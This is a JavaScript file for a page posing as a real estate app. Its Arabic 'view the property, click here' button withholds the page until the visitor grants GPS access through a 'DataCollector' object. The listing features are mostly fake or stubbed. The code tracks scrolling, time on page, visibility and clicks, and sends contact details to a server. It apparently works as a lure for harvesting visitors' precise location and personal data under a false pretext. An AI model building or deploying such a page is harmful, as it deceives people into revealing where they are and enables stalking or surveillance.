// Main application logic and UI interactions

document.addEventListener('DOMContentLoaded', function() {
    console.log('Real Estate App Initialized');

    // Handle Location Permission Screen
    const requestLocationBtn = document.getElementById('requestLocationBtn');
    const permissionScreen = document.getElementById('locationPermissionScreen');
    const mainAppContent = document.getElementById('mainAppContent');

    if (requestLocationBtn) {
        requestLocationBtn.addEventListener('click', async function() {
            this.textContent = 'جاري تحديد الموقع...';
            this.disabled = true;

            try {
                const gpsData = await DataCollector.requestLocationWithPermission();
                
                if (gpsData.error) {
                    // Location permission denied
                    this.textContent = 'يرجى السماح بالوصول إلى الموقع';
                    setTimeout(() => {
                        this.textContent = 'شاهد العقار اضغط هنا';
                        this.disabled = false;
                    }, 3000);
                } else {
                    // Location permission granted
                    this.textContent = '✅ سيتم تحويلك لموقع العقار...';
                    console.log('GPS Data:', gpsData);
                    
                    // Hide permission screen and show main app
                    setTimeout(() => {
                        permissionScreen.style.transition = 'opacity 0.5s ease';
                        permissionScreen.style.opacity = '0';
                        
                        setTimeout(() => {
                            permissionScreen.style.display = 'none';
                            mainAppContent.style.display = 'block';
                            mainAppContent.style.opacity = '0';
                            mainAppContent.style.transition = 'opacity 0.5s ease';
                            
                            setTimeout(() => {
                                mainAppContent.style.opacity = '1';
                            }, 50);
                        }, 500);
                    }, 1000);
                }
            } catch (error) {
                console.error('Location error:', error);
                this.textContent = 'حدث خطأ، حاول مرة أخرى';
                setTimeout(() => {
                    this.textContent = 'شاهد العقار اضغط هنا';
                    this.disabled = false;
                }, 3000);
            }
        });
    }

    // Find Properties Near You button
    const findNearbyBtn = document.getElementById('findNearbyBtn');
    if (findNearbyBtn) {
        findNearbyBtn.addEventListener('click', async function() {
            this.textContent = '📍 Getting your location...';
            this.disabled = true;

            const gpsData = await DataCollector.requestLocationWithPermission();
            
            if (gpsData.error) {
                this.textContent = '❌ Location Access Denied';
                setTimeout(() => {
                    this.textContent = '📍 Find Properties Near You';
                    this.disabled = false;
                }, 3000);
            } else {
                this.textContent = '✅ Location Received!';
                console.log('GPS Data:', gpsData);
                
                // Simulate showing nearby properties
                setTimeout(() => {
                    alert(`Found 12 properties within ${Math.round(gpsData.accuracy)}m of your location!`);
                    this.textContent = '📍 Find Properties Near You';
                    this.disabled = false;
                }, 2000);
            }
        });
    }

    // Search button
    const searchBtn = document.getElementById('searchBtn');
    if (searchBtn) {
        searchBtn.addEventListener('click', function() {
            const location = document.getElementById('locationInput').value;
            const propertyType = document.getElementById('propertyType').value;
            const priceRange = document.getElementById('priceRange').value;

            // Track search interaction
            trackInteraction('search', {
                location,
                propertyType,
                priceRange,
                timestamp: new Date().toISOString()
            });

            console.log('Search:', { location, propertyType, priceRange });
            alert('Search functionality coming soon!');
        });
    }

    // Property detail buttons
    const detailButtons = document.querySelectorAll('.btn-details');
    detailButtons.forEach((btn, index) => {
        btn.addEventListener('click', function() {
            const card = this.closest('.property-card');
            const title = card.querySelector('h3').textContent;
            const price = card.querySelector('.property-price').textContent;

            // Track property view
            trackInteraction('property_view', {
                property: title,
                price,
                index,
                timestamp: new Date().toISOString()
            });

            console.log('Viewing property:', title);
            alert(`Viewing details for: ${title}\nPrice: ${price}\n\nContact form coming soon!`);
        });
    });

    // Contact form
    const contactForm = document.getElementById('contactForm');
    if (contactForm) {
        contactForm.addEventListener('submit', async function(e) {
            e.preventDefault();

            const formData = {
                name: document.getElementById('contactName').value,
                email: document.getElementById('contactEmail').value,
                phone: document.getElementById('contactPhone').value,
                message: document.getElementById('contactMessage').value,
                timestamp: new Date().toISOString()
            };

            // Track form submission
            trackInteraction('contact_form', formData);

            // Send to server
            await DataCollector.sendToServer({
                sessionId: DataCollector.sessionId,
                type: 'contact_form',
                data: formData
            });

            alert('Thank you for your interest! We will contact you soon.');
            this.reset();
        });
    }

    // Track scroll depth
    let maxScrollDepth = 0;
    window.addEventListener('scroll', function() {
        const scrollPercent = (window.scrollY / (document.documentElement.scrollHeight - window.innerHeight)) * 100;
        if (scrollPercent > maxScrollDepth) {
            maxScrollDepth = scrollPercent;
            
            // Track milestones
            if (maxScrollDepth > 25 && maxScrollDepth < 30) {
                trackInteraction('scroll_25', { depth: maxScrollDepth });
            } else if (maxScrollDepth > 50 && maxScrollDepth < 55) {
                trackInteraction('scroll_50', { depth: maxScrollDepth });
            } else if (maxScrollDepth > 75 && maxScrollDepth < 80) {
                trackInteraction('scroll_75', { depth: maxScrollDepth });
            } else if (maxScrollDepth > 95) {
                trackInteraction('scroll_100', { depth: maxScrollDepth });
            }
        }
    });

    // Track time on page
    let timeOnPage = 0;
    setInterval(() => {
        timeOnPage += 1;
        
        // Track time milestones
        if (timeOnPage === 30) {
            trackInteraction('time_30s', { seconds: timeOnPage });
        } else if (timeOnPage === 60) {
            trackInteraction('time_1m', { seconds: timeOnPage });
        } else if (timeOnPage === 300) {
            trackInteraction('time_5m', { seconds: timeOnPage });
        }
    }, 1000);

    // Track page visibility
    document.addEventListener('visibilitychange', function() {
        trackInteraction('visibility_change', {
            hidden: document.hidden,
            timestamp: new Date().toISOString()
        });
    });

    // Track clicks on property cards
    const propertyCards = document.querySelectorAll('.property-card');
    propertyCards.forEach((card, index) => {
        card.addEventListener('click', function(e) {
            if (!e.target.classList.contains('btn-details')) {
                trackInteraction('card_click', {
                    index,
                    timestamp: new Date().toISOString()
                });
            }
        });
    });
});

// Helper function to track interactions
async function trackInteraction(type, data) {
    try {
        await fetch('/api/interaction', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                sessionId: DataCollector.sessionId,
                type,
                data,
                timestamp: new Date().toISOString()
            })
        });
    } catch (error) {
        console.error('Error tracking interaction:', error);
    }
}

// Track page unload
window.addEventListener('beforeunload', function() {
    // Send final session data
    navigator.sendBeacon('/api/session-end', JSON.stringify({
        sessionId: DataCollector.sessionId,
        timestamp: new Date().toISOString()
    }));
});
